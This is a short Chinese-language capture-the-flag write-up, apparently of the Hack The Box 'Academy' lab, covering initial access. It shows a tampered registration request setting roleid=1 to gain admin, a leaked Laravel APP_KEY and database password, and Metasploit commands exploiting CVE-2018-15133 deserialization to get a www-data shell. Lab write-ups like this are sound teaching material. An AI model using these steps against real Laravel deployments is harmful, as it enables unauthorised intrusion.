Phase 1

立足点：roleid 篡改 → Laravel RCE

注册时篡改角色

uid=test&password=test123&confirm=test123&roleid=1
🧒 儿童版 — 自己给自己升职注册表单有个隐藏字段 roleid，默认 0。Burp 改成 1 就变管理员——服务器不验证。

登录 /admin.php，暴露子域名 dev-staging-01.academy.htb。Laravel Whoops 错误页泄露：

APP_KEY=dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
DB_PASSWORD=secret

CVE-2018-15133 反序列化 RCE

漏洞原理APP_KEY 泄露 → 伪造加密序列化对象 → Laravel Encrypter 解密后自动 unserialize() → RCE。
msf6> use exploit/unix/http/laravel_token_unserialize_exec
msf6> set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
msf6> set VHOST dev-staging-01.academy.htb
msf6> run
www-data@academy:~$
